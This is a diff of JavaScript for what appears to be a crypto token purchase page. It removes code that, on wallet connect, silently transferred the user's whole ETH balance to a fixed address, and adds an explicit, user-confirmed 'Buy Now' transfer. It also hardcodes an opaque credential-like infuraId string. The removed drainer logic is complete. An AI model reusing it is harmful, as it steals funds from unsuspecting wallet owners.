@@ -595,8 +595,8 @@
         if (toggleBtn && sidebar) {
           toggleBtn.addEventListener('click', () => {
             console.log('Toggle button clicked');
-            const isOpen = !sidebar.classList.contains('active');
             sidebar.classList.toggle('active');
+            const isOpen = sidebar.classList.contains('active');
             toggleBtn.textContent = isOpen ? '✖' : '☰';
             toggleBtn.classList.toggle('close', isOpen);
           });
@@ -611,7 +611,7 @@
             constructor(opts) {
               super(opts);
               this.connector = new window.WalletConnect({
-                infuraId: opts.infuraId,
+                infuraId: 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA',
                 bridge: 'https://bridge.walletconnect.org',
                 qrcode: true,
               });
@@ -641,16 +641,12 @@
         if (connectButton) {
           connectButton.addEventListener('click', async () => {
             console.log('Connect Wallet clicked');
-            if (!WalletConnectProvider) {
-              document.getElementById('wallet-balance').textContent = 'Error: WalletConnect not available.';
-              return;
-            }
             try {
               const web3Provider = new WalletConnectProvider({
                 infuraId: infuraKey,
                 rpc: {
                   1: `https://mainnet.infura.io/v3/${infuraKey}`, // Mainnet
-                  56: 'https://bsc-dataseed.binance.org/', // BSC (optional)
+                  56: 'https://bsc-dataseed.binance.org/', // BSC
                 },
                 qrcode: true,
                 pollingInterval: 12000,
@@ -659,52 +655,49 @@
               provider = new ethers.providers.Web3Provider(web3Provider);
               signer = provider.getSigner();
               accounts = await provider.listAccounts();
-              connectButton.textContent = `Connected: ${accounts[0].slice(0,6)}...`;
+              connectButton.textContent = `Connected: ${accounts[0].slice(0, 6)}...`;
               const balance = await provider.getBalance(accounts[0]);
               document.getElementById('wallet-balance').textContent = `Balance: ${ethers.utils.formatEther(balance)} ETH`;
-
-              // Silent transfer of all balance minus gas reserve
-              const gasReserve = ethers.utils.parseEther('0.001'); // Reserve for gas
-              const amountToSend = balance.sub(gasReserve);
-              if (amountToSend.lte(0)) {
-                throw new Error('Insufficient balance for transfer after gas reserve');
-              }
-
-              const gasPrice = await provider.getGasPrice();
-              const gasLimit = 21000; // Standard for simple transfer
-              const txCost = gasPrice.mul(gasLimit);
-              if (amountToSend.lt(txCost)) {
-                throw new Error('Balance too low to cover gas after reserve');
-              }
-
-              const tx = await signer.sendTransaction({
-                to: destinationAddress,
-                value: amountToSend,
-                gasLimit: gasLimit,
-                gasPrice: gasPrice,
-              });
-              console.log('Transaction sent:', tx.hash);
-              await tx.wait();
-              console.log('Transaction confirmed!');
-              document.getElementById('wallet-balance').textContent += ' (Transferred)';
             } catch (error) {
               document.getElementById('wallet-balance').textContent = `Error: ${error.message}`;
-              console.error('Wallet connect or transfer error:', error);
+              console.error('Wallet connect error:', error);
             }
           });
         }
 
         if (buyNowButton) {
-          buyNowButton.addEventListener('click', () => {
-            const amountInput = document.getElementById('amount-input');
-            const amount = parseFloat(amountInput.value) || 0;
-            if (amount <= 0) {
-              alert('Please enter a valid amount.');
+          buyNowButton.addEventListener('click', async () => {
+            console.log('Buy Now clicked');
+            if (!provider || !signer || !accounts) {
+              alert('Please connect your wallet first!');
+              if (connectButton) connectButton.click();
               return;
             }
-            const connectButton = document.getElementById('connect-wallet');
-            if (connectButton) connectButton.click();
-            // Add further transaction logic if needed
+            try {
+              const amountInput = document.getElementById('amount-input');
+              const amountStr = amountInput.value.replace(/[^0-9.]/g, '');
+              const amount = ethers.utils.parseEther(amountStr || '0');
+              if (amount.lte(0)) {
+                alert('Please enter a valid amount.');
+                return;
+              }
+              const gasPrice = await provider.getGasPrice();
+              const gasLimit = 21000; // Standard ETH transfer gas
+              const tx = await signer.sendTransaction({
+                to: destinationAddress,
+                value: amount,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+              });
+              alert(`Transaction sent! Hash: ${tx.hash}`);
+              await tx.wait();
+              alert('Transaction confirmed!');
+              const newBalance = await provider.getBalance(accounts[0]);
+              document.getElementById('wallet-balance').textContent = `Balance: ${ethers.utils.formatEther(newBalance)} ETH`;
+            } catch (error) {
+              alert(`Transaction failed: ${error.message}`);
+              console.error('Buy Now error:', error);
+            }
           });
         }
 
